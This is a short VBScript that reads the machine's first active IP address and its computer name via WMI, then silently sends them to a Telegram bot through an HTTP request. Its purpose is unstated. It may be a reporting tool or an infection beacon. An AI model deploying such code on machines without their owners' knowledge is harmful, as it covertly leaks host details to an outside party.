Dim NIC1, Nic, StrIP, CompName, WshNetwork, xmlHttp
Set NIC1 = GetObject("winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")

For Each Nic in NIC1
    If Nic.IPEnabled Then
        StrIP = Nic.IPAddress(0)

        Set WshNetwork = WScript.CreateObject("WScript.Network")
        CompName = WshNetwork.Computername

        Exit For 
    End If
Next

If StrIP <> "" Then
    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xmlHttp.Open "GET", "https://api.telegram.org/bot[TOKEN]/sendMessage?chat_id=[ID]&text="&CompName+" ip:"&StrIP, False
    xmlHttp.Send
End If

WScript.Quit
